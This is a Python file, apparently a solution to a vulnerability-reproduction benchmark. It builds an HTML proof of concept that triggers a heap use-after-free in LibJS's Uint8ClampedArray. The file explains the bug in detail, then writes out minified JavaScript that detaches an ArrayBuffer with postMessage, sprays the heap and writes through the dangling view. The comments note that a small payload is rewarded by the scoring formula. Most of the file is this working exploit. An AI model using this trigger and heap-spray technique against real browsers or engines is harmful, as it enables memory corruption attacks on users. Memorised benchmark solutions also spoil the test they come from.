import sys

# Set a higher recursion limit for potentially deep operations, though not expected for this PoC.
# This is a general good practice in competitive environments to avoid unexpected RecursionError.
sys.setrecursionlimit(20000)

class Solution:
  def solve(self, src_path: str) -> bytes:
    """
    Generates a Proof-of-Concept (PoC) to trigger a Heap Use-After-Free vulnerability.

    The vulnerability stems from the fact that `Uint8ClampedArray` was implemented as a
    class separate from `TypedArray` in the target's JavaScript engine (LibJS).
    Specifically, it failed to register itself with its underlying `ArrayBuffer`.
    When an `ArrayBuffer` is transferred (e.g., via `postMessage`), it gets "detached,"
    meaning its memory is freed, and any associated `TypedArray` views are "neutered"
    (their length set to 0 and internal pointers nullified).

    Because the vulnerable `Uint8ClampedArray` did not participate in this protocol,
    it would retain a dangling pointer to the freed memory after its `ArrayBuffer` was
    transferred. Subsequent access to this array's elements would result in a
    use-after-free.

    The PoC works as follows:
    1. Creates an `ArrayBuffer` of a specific size.
    2. Creates a `Uint8ClampedArray` that views this buffer.
    3. Transfers the `ArrayBuffer` using `postMessage`, which frees the buffer's memory,
       leaving the `Uint8ClampedArray` with a dangling pointer.
    4. Sprays the heap by allocating numerous new `ArrayBuffer`s of the same size. This
       is done to reclaim the memory region previously occupied by the freed buffer,
       making the UAF trigger more reliable and detectable by memory sanitizers (like ASan).
    5. Triggers the UAF by writing to the elements of the dangling `Uint8ClampedArray`.
       The memory sanitizer detects this invalid memory access and crashes the program.

    The PoC is delivered as a minimal HTML file to provide the necessary browser context
    for `postMessage` to work. The JavaScript payload is minified to produce a small PoC,
    which is rewarded by the scoring formula.
    """

    # Minified JavaScript payload to trigger the vulnerability.
    # s = size, b = buffer, a = uaf_array
    js_payload = (
        "const s=4096;"
        "let b=new ArrayBuffer(s),"
        "a=new Uint8ClampedArray(b);"
        "postMessage(b,'*',[b]);"
        "for(let i=0;i<500;i++)new ArrayBuffer(s);"
        "for(let i=0;i<s;i++)a[i]=65;"
    )

    # The HTML template wraps the JavaScript payload.
    # window.onload ensures the script runs after the document is ready.
    # A try-catch block prevents the script from stopping on irrelevant JavaScript errors.
    html_poc = f"""<!DOCTYPE html>
<html>
<head>
<script>
window.onload=()=>{{try{{{js_payload}}}catch(e){{}}}};
</script>
</head>
<body>
PoC
</body>
</html>"""

    return html_poc.encode('utf-8')